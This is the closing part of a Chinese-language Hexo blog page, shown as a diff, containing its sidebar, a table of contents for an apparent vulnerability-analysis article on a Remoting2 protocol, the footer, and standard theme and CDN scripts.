+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        33
+                    </p>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://p1ay2win.github.io" target="_blank">
+                关注我</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/P1ay2win/">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="https://twitter.com/p1ay2win">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+
+    
+        
+
+    <div class="card widget column-left is-sticky" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    目录
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#前言">
+        <span class="has-mr-6">1</span>
+        <span>前言</span>
+        </a></li><li>
+        <a class="is-flex" href="#Remoting2协议">
+        <span class="has-mr-6">2</span>
+        <span>Remoting2协议</span>
+        </a></li><li>
+        <a class="is-flex" href="#漏洞分析">
+        <span class="has-mr-6">3</span>
+        <span>漏洞分析</span>
+        </a></li><li>
+        <a class="is-flex" href="#随便看看">
+        <span class="has-mr-6">4</span>
+        <span>随便看看</span>
+        </a></li><li>
+        <a class="is-flex" href="#后记">
+        <span class="has-mr-6">5</span>
+        <span>后记</span>
+        </a></li><li>
+        <a class="is-flex" href="#参考">
+        <span class="has-mr-6">6</span>
+        <span>参考</span>
+        </a></li></ul>
+            </div>
+        </div>
+    </div>
+
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+        </div>
+    
+</div>
+
+
+                
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    P1ay2win&#39;s blog
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2022 P1ay2win&nbsp;
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>访问量<span id="busuanzi_value_site_pv"></span>次  <i class="fa fa-user-md"></i>  访客数<span id="busuanzi_value_site_uv"></span>人<br>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://p1ay2win.github.io">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+<script>
+var IcarusThemeSettings = {
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+    
+    
+<script src="/js/animation.js"></script>
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+    
+    
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+    
+    
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
